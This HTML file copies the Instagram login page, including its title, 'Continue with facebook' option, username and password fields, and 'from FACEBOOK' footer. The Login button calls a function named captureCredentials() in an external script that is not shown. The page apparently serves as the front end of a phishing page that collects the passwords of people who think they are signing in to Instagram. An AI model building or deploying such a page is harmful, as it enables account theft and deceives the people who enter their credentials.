<!DOCTYPE html>
<html lang="en">
    <head>
        <!--Boiler plate code-->
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
        <!--Stylesheet relations-->
        <link rel="stylesheet" href="stylesheets/style.css">
    
        <!--Script Referances-->
        <script src="scripts/scr.js"></script>
    
        <!--Icon Relations-->
        <link rel="apple-touch-icon" sizes="180x180" href="favicon_io/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="favicon_io/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="favicon_io/favicon-16x16.png">
        <link rel="manifest" href="favicon_io/site.webmanifest">
    
        <!--Font Relations-->
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@600&display=swap" rel="stylesheet">        
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700&display=swap" rel="stylesheet">

        <!--Title-->
        <title>
            
            Instagram

        </title>

    </head>

    <body>

        <div id = "loader">
        </div>

        <section id = "mainPage">

            <span id = "english">
                English
            </span>

            <div class="main">
                <div id ="wording">

                </div>

                <div class="loginWithFaceBook">
                    Continue with facebook
                </div>

                <div class="or">
                    OR
                </div>

                <div class="wrapper">

                    <div class="input-Data">

                        <input type="text" class = "inputy" id = "upperInputText"required>

                        <div class="labelWrapper">

                            <label>

                                Phone number, username or email

                            </label>

                        </div>

                    </div>

                    <div class="input-Data" id = "lowerInput">
                        
                        <input type="password" class = "inputy" required id = "passwordInput" onkeyup="lightup(this.value)">
                        
                        <div class="labelWrapper">

                            <label>

                                password

                            </label>

                        </div>

                        <div class="showpaas">

                            <button onclick="showPass()" id = "passButton">
                                
                                Show
                            
                            </button>

                        </div>

                    </div>
                    
                    <div id="forgotPassword">
                        
                        <label>

                            Forgot Password?

                        </label>

                    </div>

                    <div class="logIn" id="loginButton">
                        
                        <button onclick="captureCredentials()">
                            
                            Login

                        </button>

                    </div>

                    <div class="dontHaveAnAccount">
                        
                        <p>

                            Dont have an account?

                            <button>

                                Sign up
                            
                            </button>
                        
                        </p>

                    </div>

                    <div class="fromFacebook">

                        <p>

                            from 

                        </p>


                        <p id = "facebook">

                            FACEBOOK

                        </p>

                    </div>

                </div>

            </div>
        </section>
        
    </body>

</html>
